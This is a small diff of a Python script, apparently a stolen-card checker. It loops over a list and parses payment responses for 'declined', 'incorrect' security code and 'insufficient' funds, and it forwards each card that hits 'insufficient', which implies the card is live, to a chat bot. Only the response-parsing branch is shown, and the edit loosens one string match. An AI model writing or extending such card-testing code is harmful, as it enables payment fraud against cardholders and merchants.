@@ -97,7 +97,7 @@ for i in range(len(filtered_lines) - 1):
 	#print(response1)
 	if "declined" in response1:
 			print("Your payment was declined"+f"{c}")
-	elif "security code is incorrect" in response1:
+	elif "incorrect" in response1:
 		print("security code is incorrect"+f"{c}")
 	elif "insufficient" in  response1:
 				bot1.send_message(id1, c)
